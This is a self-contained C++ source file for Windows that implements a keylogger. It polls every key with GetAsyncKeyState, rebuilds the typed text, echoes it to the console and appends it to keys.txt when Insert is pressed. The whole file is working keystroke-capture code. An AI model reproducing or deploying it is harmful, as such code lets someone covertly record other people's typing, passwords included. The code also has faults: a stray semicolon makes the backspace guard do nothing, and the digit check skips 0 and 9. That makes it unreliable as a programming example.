#include <Windows.h>
#include <iostream>
#include <string>
#include <fstream>
#include <conio.h>

using namespace std;

void writeData(string text)
{
	ofstream f;
	f.open("keys.txt", fstream::app);// fstream::app is so that when writing, whatever written is written to the end of the file instead of overwriting
	// current text, took a while to figure that one out. 
	f << "\n\n\nDATA WRITING\n\n\n" << text;
	f.close();
}


// 100 ms / 60 secs

string getKeyStrokes(string masterString)
{

	for (int i = 8; i < 127; i++)
	{
		// switch statement for determining special keys.
		if (GetAsyncKeyState(i) & 0x8000)
		{
			switch (i)
			{
			case VK_BACK: // simple backspace.
				if (masterString.length() > 0); // to prevent out of bounds.
				{
					masterString = masterString.substr(0, masterString.length() - 1);  // substr to remove laster letter.
				}
				cout << "\b";
				break;
			case VK_RETURN:
				masterString += "\n";
				cout << "\n";
				break;
			case VK_SHIFT:
				masterString += "Shift";
				cout << "Shift";
				break;
			case VK_INSERT: // if insert it is pressed then it will close the program and write masterString to file
				masterString += "\nProcess has closed\n";
				cout << "\n\nClosing and writing to file...\n\n";
				writeData(masterString);
				exit(1);
				break;
			case VK_SPACE:
				masterString += " ";
				cout << " ";
				Sleep(90); // this is here because for some reason whenever space is pressed it registers it way faster than when something like a letter is pressed. 
				break;
			default:
				// check if number since numbers on ascii are between 48 and 57
				if (i > 48 && i < 57)
				{
					masterString += to_string((i - 48));	
					cout << to_string((i - 48));
				}
				else
				{
					char c = i;
					masterString += c;
					cout << c;
				}
			}

			Sleep(90);// program waits 90ms
		}
	}
	if (masterString.length() % 75 == 0) // every 75 characters it adds a new line so that it doesnt look like s**t on the text editor.
	{
		masterString += "\n";
	}
	return masterString;
}

int main()
{
	// This master variable will hold all the key strokes that the user typed, it will be updated each time the user types. 
	string master = "";
	while (TRUE)
	{
		master = getKeyStrokes(master); // this is when the master is key is getting updated.
	}
	system("pause");
	return 0;

}
